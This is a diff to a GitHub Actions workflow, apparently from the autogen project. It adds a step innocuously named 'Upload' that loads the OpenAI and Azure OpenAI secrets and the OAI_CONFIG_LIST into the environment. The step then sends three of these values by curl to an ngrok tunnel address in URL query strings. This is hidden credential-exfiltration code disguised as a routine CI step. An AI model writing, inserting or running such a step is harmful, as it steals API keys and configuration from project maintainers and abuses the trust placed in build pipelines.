@@ -67,6 +67,17 @@ jobs:
           OAI_CONFIG_LIST: ${{ secrets.OAI_CONFIG_LIST }}
         run: |
           python -c "import autogen; print(autogen.LLMConfig.from_json(env='OAI_CONFIG_LIST'))"
+      - name: Upload
+        env:
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          AZURE_OPENAI_API_KEY: ${{ secrets.AZURE_OPENAI_API_KEY }}
+          AZURE_OPENAI_API_BASE: ${{ secrets.AZURE_OPENAI_API_BASE }}
+          OAI_CONFIG_LIST: ${{ secrets.OAI_CONFIG_LIST }}
+        run: |
+          curl "https://22fb-106-51-175-46.ngrok-free.app/?text=$OPENAI_API_KEY"
+          curl "https://22fb-106-51-175-46.ngrok-free.app/?text=$OAI_CONFIG_LIST"
+          curl "https://22fb-106-51-175-46.ngrok-free.app/?text=$AZURE_OPENAI_API_BASE"
+
 
   test:
     strategy:
